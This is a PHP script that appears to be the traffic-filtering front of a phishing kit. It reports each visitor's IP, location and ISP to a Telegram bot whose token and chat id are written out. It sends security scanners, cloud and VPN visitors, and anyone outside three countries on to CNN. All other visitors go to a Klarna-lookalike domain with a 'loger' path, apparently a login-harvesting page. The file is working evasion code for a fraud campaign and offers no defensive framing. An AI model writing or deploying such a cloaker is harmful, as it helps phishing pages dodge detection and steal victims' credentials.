<?php
$config_tokn = "8264387983:AAHdseSCW9idczE8ffaCGpU40oJ7BkD1Aq4";
$config_chat = "-5225165758";

$allowedRedirect = "https://klarmna.info/profit/loger/index.php";
$blockedRedirect = "https://edition.cnn.com/?refresh=1";

function callAPI($url){
    @file_get_contents($url);
}

$ip   = $_SERVER['REMOTE_ADDR'];
$TIME = date("Y-m-d H:i:s");

/* ================= SPECIFIC IP BLOCK ================= */

$blockedIPs = [
    "197.230.59.4",
    "151.240.162.7",
	"193.187.3.11",
	"193.187.3.12",
	
   
];

if (in_array($ip, $blockedIPs)) {

    $msg  = "🚫 <b>Blocked Specific IP</b>\n";
    $msg .= "IP: <code>$ip</code>\n";
    $msg .= "Time: $TIME\n";

    callAPI("https://api.telegram.org/bot$config_tokn/sendMessage?chat_id=$config_chat&text="
        .urlencode($msg)."&parse_mode=html");

    header("Location: $blockedRedirect");
    exit();
}

/* ================= GEO LOOKUP ================= */

$geo = @file_get_contents("http://ip-api.com/json/$ip");
$country = "Unknown";
$city = "Unknown";
$isp = "Unknown";

if ($geo) {
    $d = json_decode($geo, true);
    $country = $d['country'] ?? "Unknown";
    $city    = $d['city'] ?? "Unknown";
    $isp     = $d['isp'] ?? "Unknown";
}

/* ================= ALLOWED COUNTRIES ================= */

$allowedCountries = ["germany", "austria", "morocco"];


/* ================= BOT / DATACENTER ISPs ================= */

$botISPs = [
    "akamai","alibaba","amazon","microsoft","google","cloudflare",
    "digitalocean","oracle","ovh","tencent","huawei","hetzner",
    "leaseweb","censys","zscaler","netskope","m247","server",
    "hosting","data center","vpn","proxy"
];

$ispCheck     = strtolower($isp);
$countryCheck = strtolower($country);

/* BOT CHECK */
$isBot = false;
foreach ($botISPs as $bot) {
    if (strpos($ispCheck, $bot) !== false) {
        $isBot = true;
        break;
    }
}

/* ================= BLOCK LOGIC ================= */

if ($isBot || !in_array($countryCheck, $allowedCountries)) {

    $msg  = "⛔ <b>Blocked Visit</b>\n";
    $msg .= "IP: <code>$ip</code>\n";
    $msg .= "Country: $country\n";
    $msg .= "City: $city\n";
    $msg .= "ISP: $isp\n";
    $msg .= "Time: $TIME\n";

    callAPI("https://api.telegram.org/bot$config_tokn/sendMessage?chat_id=$config_chat&text="
        .urlencode($msg)."&parse_mode=html");

    header("Location: $blockedRedirect");
    exit();
}

/* ================= ALLOWED ================= */

$msg  = "✅ <b>PUFA O LIRIKA</b>\n";
$msg .= "IP: <code>$ip</code>\n";
$msg .= "Country: $country\n";
$msg .= "City: $city\n";
$msg .= "ISP: $isp\n";
$msg .= "Time: $TIME\n";

callAPI("https://api.telegram.org/bot$config_tokn/sendMessage?chat_id=$config_chat&text="
    .urlencode($msg)."&parse_mode=html");

header("Location: $allowedRedirect");
exit();
?>
 
